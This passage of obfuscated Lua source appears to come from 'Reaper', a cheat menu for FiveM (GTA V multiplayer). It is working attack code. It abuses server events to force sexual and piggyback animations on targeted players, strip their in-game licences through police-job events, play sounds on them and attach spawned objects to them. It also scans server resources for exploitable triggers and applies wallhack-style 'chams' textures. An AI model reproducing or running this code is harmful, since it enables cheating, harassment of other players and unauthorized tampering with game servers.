                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'anim@arena@celeb@flat@paired@no_props@', 'piggyback_c_player_a', 'piggyback_c_player_b', -0.07, 0.0, 0.45, v.extra, 100000, 0.0, 49, 33, 1)
                                elseif p1 == 'Secks' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', -0.07, 0.0, 0.45, v.extra, 100000, 0.0, 49, 33, 1)
                                elseif p1 == 'Fucked' then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'anim@arena@celeb@flat@paired@no_props@', 'piggyback_c_player_a', 'piggyback_c_player_b', -0.07, 0.0, 0.45, v.extra, 100000, 0.0, 256, 256, 1)
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerPiggyback = __REAPER1__.F.DynamicTrigger('PiggyBack', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                license = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerRemoveLic then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerRemoveLic, v.extra, p4)

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerRemoveLic = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', "label = %(")
                    end
                end,
                sound = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('InteractSound') == 'started' then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent('InteractSound_SV:PlayOnOne', v.extra, string.lower(p2[p4]), 10000.0)

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                csound = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerHifi then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerHifi, p4, __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))))

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerHifi = __REAPER1__.F.DynamicTrigger('esx_hifi', 'TriggerServerEvent', "__REAPER25__%(")
                    end
                end,
            },
            particle = {
                play = function(p1, p2, p3, p4, p5, p6, p7)
                    local rx, ry, rz = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['server:targetinglist:particle_rotation'].func, ' ', true)
                    local ax, ay, az = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['server:targetinglist:particle_axis'].func, ' ', true)
                    
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)))
                            __REAPER1__.N.DoParticle(__REAPER1__.T.ParticleEffects[__REAPER1__.A['server:targetinglist:particle_type'].sindex].dict, __REAPER1__.T.ParticleEffects[__REAPER1__.A['server:targetinglist:particle_type'].sindex].name, coords.x, coords.y, coords.z, __REAPER1__.F.IntToFloat(__REAPER1__.A['server:targetinglist:particle_scale'].sindex), rx, ry, rz, ax, ay, az)
                    
                            __REAPER26__(300)
                        end
                    end)
                end,
            },
            attach = {
                attach = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p6) then
                            for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                                v = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                                local obj = __REAPER1__.N.CreateObject(p6, __REAPER1__.N.GetEntityCoords(v), true, true, false)
                                __REAPER1__.N.AttachEntityToEntity(obj, v, 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 1, true)

                                __REAPER26__(5)
                            end
                        end
                    end)
                end
            },
        },
        visuals = {
            chams = {
                chams = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if not __REAPER1__.V.Cham then
                            __REAPER1__.V.Cham = __REAPER1__.N.CreateDui('https://i.imgur.com/uDSKdwd.png', 500, 500)
                            __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER18__'), '__REAPER19__', __REAPER1__.N.GetDuiHandle(__REAPER1__.V.Cham))
                        end

                        for k,v in ipairs(__REAPER1__.T.ChamParts) do
                            for _k,_v in ipairs(__REAPER1__.T.ChamNumbers[v] or __REAPER1__.T.ChamNumbers['rest']) do
                                for x,d in ipairs(__REAPER1__.T.ChamTextures[v] or __REAPER1__.T.ChamTextures['casual']) do
                                    local part = v .. '_diff_' .. _v .. d
                                    if p2 and __REAPER1__.A['visuals:chams_target'].sindex == 1 then
                                        __REAPER1__.N.Cham('mp_m_freemode_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_airraces_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_airraces_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_apt01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_apt01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_assault\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_assault\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_battle\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_battle\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_bikerdlc_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_bikerdlc_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_xmas2\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_xmas2\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_christmas2017\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_christmas2017\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_christmas2018\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_christmas2018\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_executive_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_executive_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_gunrunning_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_gunrunning_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_halloween\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_halloween\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_heist\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_heist\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_heist3\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_heist3\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_heist4\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_heist4\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_importexport_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_importexport_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_january2016\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_january2016\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_lowrider_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_lowrider_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_lowrider_02\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_lowrider_02\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_luxe_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_luxe_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_luxe_02\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_luxe_02\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_beach\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_beach\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_business\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_business\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_hipster\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_hipster\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_independence\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_independence\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_mplts\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_mplts\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_htb_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_htb_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_smuggler_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_smuggler_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_stunt_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_stunt_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_sum\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_sum\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_valentines_02\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_valentines_02\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_vinewood\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_vinewood\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_mp_m_xmas_03\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_mp_m_xmas_03\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_pilot\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_pilot\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_business2\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_business2\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_xmas\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_xmas\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_m_freemode_01_male_freemode_valentines\\' .. part, part, p2 and '__REAPER18__' or 'mp_m_freemode_01_male_freemode_valentines\\' .. part, p2 and '__REAPER19__' or part)
                                    elseif p2 and __REAPER1__.A['visuals:chams_target'].sindex == 2 then
                                        __REAPER1__.N.Cham('mp_f_freemode_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_airraces_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_airraces_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_apt01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_apt01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_assault\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_assault\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_battle\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_battle\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_bikerdlc_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_bikerdlc_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_xmas2\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_xmas2\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_christmas2017\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_christmas2017\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_christmas2018\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_christmas2018\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_executive_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_executive_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_gunrunning_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_gunrunning_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_halloween\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_halloween\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_heist\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_heist\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_heist3\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_heist3\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_heist4\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_heist4\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_importexport_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_importexport_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_january2016\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_january2016\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_lowrider_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_lowrider_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_lowrider_02\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_lowrider_02\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_luxe_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_luxe_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_luxe_02\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_luxe_02\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_beach\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_beach\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_business\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_business\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_hipster\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_hipster\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_independence\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_independence\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_mplts\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_mplts\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_htb_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_htb_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_smuggler_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_smuggler_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_stunt_01\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_stunt_01\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_sum\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_sum\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_valentines_02\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_valentines_02\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_vinewood\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_vinewood\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_mp_m_xmas_03\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_mp_m_xmas_03\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_pilot\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_pilot\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_business2\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_business2\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_xmas\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_xmas\\' .. part, p2 and '__REAPER19__' or part)
                                        __REAPER1__.N.Cham('mp_f_freemode_01_male_freemode_valentines\\' .. part, part, p2 and '__REAPER18__' or 'mp_f_freemode_01_male_freemode_valentines\\' .. part, p2 and '__REAPER19__' or part)
                                    elseif not p2 or p2 and __REAPER1__.A['visuals:chams_target'].sindex == 3 then
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01\\' .. part, part)  
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_airraces_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_apt01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_assault\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_battle\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_bikerdlc_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_xmas2\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_christmas2017\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_christmas2018\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_executive_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_gunrunning_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_halloween\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_heist\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_heist3\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_heist4\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_importexport_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_january2016\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_lowrider_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_lowrider_02\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_luxe_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_luxe_02\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_beach\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_business\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_hipster\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_independence\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_mplts\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_htb_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_smuggler_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_stunt_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_sum\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_valentines_02\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_vinewood\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_mp_m_xmas_03\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_pilot\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_business2\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_xmas\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_m_freemode_01_male_freemode_valentines\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01\\' .. part, part)  
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_airraces_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_apt01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_assault\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_battle\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_bikerdlc_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_xmas2\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_christmas2017\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_christmas2018\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_executive_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_gunrunning_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_halloween\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_heist\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_heist3\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_heist4\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_importexport_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_january2016\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_lowrider_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_lowrider_02\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_luxe_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_luxe_02\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_beach\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_business\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_hipster\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_independence\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_mplts\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_htb_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_smuggler_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_stunt_01\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_sum\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_valentines_02\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_vinewood\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_mp_f_xmas_03\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_pilot\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_business2\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_xmas\\' .. part, part)
                                        __REAPER1__.N.DeleteCham('mp_f_freemode_01_female_freemode_valentines\\' .. part, part)
                                    end
                                end
                            end
                        end

                        __REAPER1__.F.AddNotification(p2 and 'Applied chams.' or 'Removed chams.', 5000, 0, 170, 10)
                    end)
                end,
                texture = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetDuiUrl(__REAPER1__.V.Cham, p4 and __REAPER1__.T.ChamDuis[p4] or p2)
                end,
                wchams = function(p1, p2, p3, p4, p5, p6, p7)
                    if not __REAPER1__.V.WCham then
                        __REAPER1__.V.WCham = __REAPER1__.N.CreateDui('https://i.imgur.com/uDSKdwd.png', 500, 500)
                        __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd('__REAPER19__'), '__REAPER20__', __REAPER1__.N.GetDuiHandle(__REAPER1__.V.WCham))
                    end

                    for k,v in ipairs(__REAPER1__.T.WeaponChams) do
                        if not p2 or p2 and (__REAPER1__.A['visuals:chams_weapon'].sindex == 1 or string.find(v, string.lower(__REAPER1__.A['visuals:chams_weapon'].func[__REAPER1__.A['visuals:chams_weapon'].sindex]), 1, true)) then
                            __REAPER1__.N.Cham(v, v, p2 and '__REAPER19__' or v, p2 and '__REAPER20__' or v)
                        end
                    end

                    __REAPER1__.F.AddNotification(p2 and 'Applied chams.' or 'Removed chams.', 5000, 0, 170, 10)
                end,
                wtexture = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetDuiUrl(__REAPER1__.V.WCham, p4 and __REAPER1__.T.ChamDuis[p4] or p2)
                end,
            },
            blips = {
                refresh = function(p1, p2, p3, p4, p5, p6, p7)
